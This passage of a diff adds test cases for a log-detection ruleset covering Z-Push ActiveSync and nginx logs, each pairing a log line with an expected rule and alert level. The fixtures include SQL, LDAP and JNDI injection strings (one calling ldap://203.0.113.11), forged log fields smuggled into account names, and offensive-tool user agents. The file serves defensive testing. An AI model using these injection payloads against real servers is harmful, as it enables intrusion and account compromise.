+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132215",
+   "expect_level": 10,
+   "note": "synth near-miss: twenty-four accounts from one address is single-source spraying (132215), not 132225"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [o'brien@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='obrienphone0000000000000a' getUser='o'brien@example.com' from='192.168.0.206' idle='0s' version='2.7.6 ' method='POST' httpcode='200' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132260",
+   "expect_level": 3,
+   "note": "synth: an apostrophe in the login (1.1 left the line undecoded, level 0)"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [o'brien@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='obrienphone0000000000000a' getUser='o'brien@example.com' from='203.0.113.8' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132210",
+   "expect_level": 5,
+   "note": "synth: a rejected login with an apostrophe is counted (1.1: undecoded)"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [o'brien@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='obrienphone0000000000000a' getUser='o'brien@example.com' from='192.168.0.206' idle='0s' version='2.7.6 ' method='POST' httpcode='200' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132207",
+   "expect_level": 2,
+   "note": "synth near-miss: an apostrophe alone is not an injection",
+   "repeat": 2
+  },
+  {
+   "log": "11/10/2026 11:20:01 [42301] [ INFO] [u1] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='x1' from='192.168.0.9' idle='0s' version='2.7.6' method='POST' httpcode='200' from='203.0.113.9' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42302] [ INFO] [u2] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='x2' from='192.168.0.9' idle='0s' version='2.7.6' method='POST' httpcode='200' from='203.0.113.9' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42303] [ INFO] [u3] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='x3' from='192.168.0.9' idle='0s' version='2.7.6' method='POST' httpcode='200' from='203.0.113.9' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42304] [ INFO] [u4] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='x4' from='192.168.0.9' idle='0s' version='2.7.6' method='POST' httpcode='200' from='203.0.113.9' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42305] [ INFO] [u5] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='x5' from='192.168.0.9' idle='0s' version='2.7.6' method='POST' httpcode='200' from='203.0.113.9' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42306] [ INFO] [u6] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='x6' from='192.168.0.9' idle='0s' version='2.7.6' method='POST' httpcode='200' from='203.0.113.9' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42307] [ INFO] [u7] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='x7' from='192.168.0.9' idle='0s' version='2.7.6' method='POST' httpcode='200' from='203.0.113.9' idle='0s' version='2.7.6 ' method='POST' httpcode='401' \n11/10/2026 11:20:01 [42308] [ INFO] [u8] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='x8' from='192.168.0.9' idle='0s' version='2.7.6' method='POST' httpcode='200' from='203.0.113.9' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132215",
+   "expect_level": 10,
+   "note": "synth: account names imitating from='192.168.0.9' ... httpcode='200'; 1.1 decoded the forged private address and raised 132216, now the real 203.0.113.9 is decoded and 132215 (with the active response) fires on it"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [x] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='x' or '1'='1' from='203.0.113.10' idle='0s' version='2.7.6 ' method='POST' httpcode='500' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132273",
+   "expect_level": 8,
+   "note": "synth (CVE-2025-8264 class): SQL-shaped account name, server error"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [admin' or 1=1-- ] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='x' from='203.0.113.10' idle='0s' version='2.7.6 ' method='POST' httpcode='500' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132274",
+   "expect_level": 8,
+   "note": "synth: SQL-shaped login in the Authorization header, server error"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [x] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='x' or '1'='1' from='203.0.113.10' idle='0s' version='2.7.6 ' method='POST' httpcode='200' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132275",
+   "expect_level": 12,
+   "note": "synth: SQL-shaped account name and the request succeeded"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [*)(uid=*))(|(uid=*] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='x' from='203.0.113.10' idle='0s' version='2.7.6 ' method='POST' httpcode='200' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132276",
+   "expect_level": 12,
+   "note": "synth: LDAP-filter-shaped login succeeded"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='x' or '1'='1' from='203.0.113.10' idle='0s' version='2.7.6 ' method='POST' httpcode='401' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132210",
+   "expect_level": 5,
+   "note": "synth near-miss: a rejected request with an injection-shaped account stays a counted failure (no evasion of 132214/132215)"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [${jndi:ldap://203.0.113.11/a}] cmd='Sync' memory='1.60 MiB/2.00 MiB' time='0.10s' devType='iPhone' devId='k3j9x0exampledevice00000aa' getUser='x' from='203.0.113.10' idle='0s' version='2.7.6 ' method='POST' httpcode='500' ",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132274",
+   "expect_level": 8,
+   "note": "synth: JNDI-shaped login"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] User-agent: 'python-EAS-Client 1.0'",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132270",
+   "expect_level": 6,
+   "note": "synth from PEAS eas_client/activesync.py: first request of an account from a tool"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] User-agent: 'python-EAS-Client 1.0'",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132271",
+   "expect_level": 2,
+   "note": "synth: the same account and tool again (fts)",
+   "repeat": 2
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] User-agent: 'python-EAS-Client 1.0'\n11/10/2026 11:20:01 [41234] [ INFO] [asmith@example.com] User-agent: 'python-EAS-Client 1.0'",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132270",
+   "expect_level": 6,
+   "note": "synth: the same tool with another account is a new pair"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] User-agent: 'Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1'",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132270",
+   "expect_level": 6,
+   "note": "synth from EASSniper.ps1 (Invoke-WebRequest default user agent)"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] User-agent: 'Python'",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132270",
+   "expect_level": 6,
+   "note": "synth from pyActiveSync MSASHTTP.py USER_AGENT"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] User-agent: 'curl/8.5.0'",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132270",
+   "expect_level": 6,
+   "note": "synth: curl (also the setup verify step: one alert per account, ever)"
+  },
+  {
+   "log": "Oct 10 05:01:01 zpush2 zpush 10/10/2026 05:01:01 [883929] [ INFO] [asmith@example.com] User-agent: 'Apple-iPhone17C3/2307.90'",
+   "location": "/var/log/syslog",
+   "expect_rule": "132202",
+   "expect_level": 0,
+   "note": "real near-miss: the iOS mail app"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] User-agent: 'Outlook-iOS/2.0'",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132202",
+   "expect_level": 0,
+   "note": "synth near-miss: Outlook for iOS"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ INFO] [jdoe@example.com] User-agent: 'Android-Mail/2026.08.31.977101690.Release'",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132202",
+   "expect_level": 0,
+   "note": "real user agent near-miss: Android mail app"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ WARN] [jdoe@example.com] Searchtype 'DOCUMENTLIBRARY' is not supported.",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132272",
+   "expect_level": 8,
+   "note": "synth from lib/request/search.php 2.7.6 (backends other than Zimbra)"
+  },
+  {
+   "log": "11/10/2026 11:20:01 [41234] [ WARN] [jdoe@example.com] Searchtype 'FOO' is not supported.",
+   "location": "/var/log/z-push/z-push.log",
+   "expect_rule": "132203",
+   "expect_level": 2,
+   "note": "synth near-miss: another unsupported type"
+  },
+  {
+   "log": "203.0.113.60 - jdoe [11/Oct/2026:11:03:56 +0800] \"POST /Microsoft-Server-ActiveSync?Cmd=FolderSync&User=jdoe&DeviceId=0a1b2c3d4e5f60718293a4b5c6d7e8f9&DeviceType=iPhone HTTP/1.1\" 200 312 \"-\" \"python-EAS-Client 1.0\"",
+   "location": "/var/log/nginx/access.log",
+   "expect_rule": "132281",
+   "expect_level": 8,
+   "note": "synth from PEAS (default DeviceType iPhone): the tool rule wins over the device type rule"
+  },
+  {
+   "log": "203.0.113.61 - jdoe [11/Oct/2026:11:03:56 +0800] \"POST /Microsoft-Server-ActiveSync?Cmd=Sync&User=jdoe&DeviceId=0a1b2c3d4e5f60718293a4b5c6d7e8f9&DeviceType=iPhone HTTP/1.1\" 200 312 \"-\" \"Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\"",
+   "location": "/var/log/nginx/access.log",
+   "expect_rule": "132282",
+   "expect_level": 7,
+   "note": "synth: DeviceType iPhone from a browser user agent"
+  },
+  {
+   "log": "203.0.113.62 - - [11/Oct/2026:11:03:56 +0800] \"POST /Autodiscover/Autodiscover.xml HTTP/1.1\" 401 0 \"-\" \"Go-http-client/1.1\"",
+   "location": "/var/log/nginx/access.log",
+   "expect_rule": "132281",
+   "expect_level": 8,
+   "note": "synth: autodiscover spraying from a Go client"
+  },
+  {
+   "log": "192.0.2.166 - jdoe@example.com [11/Oct/2026:11:03:56 +0800] \"POST /Microsoft-Server-ActiveSync?User=jdoe@example.com&DeviceId=K3J9X0EXAMPLEDEVICE00000AA&DeviceType=iPhone&Cmd=Sync HTTP/1.1\" 401 0 \"-\" \"Apple-iPhone17C3/2307.90\"",
+   "location": "/var/log/nginx/access.log",
+   "expect_rule": "31101",
+   "expect_level": 5,
+   "note": "real shape near-miss: a rejected iPhone POST stays the built-in 400 rule"
+  },
+  {
+   "log": "192.0.2.68 - checkstatus [11/Oct/2026:11:03:56 +0800] \"GET /Microsoft-Server-ActiveSync HTTP/1.1\" 200 1051 \"-\" \"curl/8.5.0\"",
+   "location": "/var/log/nginx/access.log",
+   "expect_rule": "none",
+   "expect_level": 0,
+   "note": "synth near-miss: a monitoring GET with curl is not counted (POST only)"
+  },
+  {
+   "log": "Oct 11 11:03:56 zpush1 zpush_access 198.51.100.28 - asmith@example.com [11/Oct/2026:11:03:56 +0800] \"POST /Microsoft-Server-ActiveSync?User=asmith@example.com&DeviceId=androidc000000001&DeviceType=Android&Cmd=Sync HTTP/1.1\" 200 0 \"-\" \"Android-Mail/2026.08.31.977101690.Release\"",
+   "location": "/var/log/syslog",
+   "expect_rule": "132280",
+   "expect_level": 0,
+   "note": "real shape near-miss: Android mail app"
   }
  ]
 }
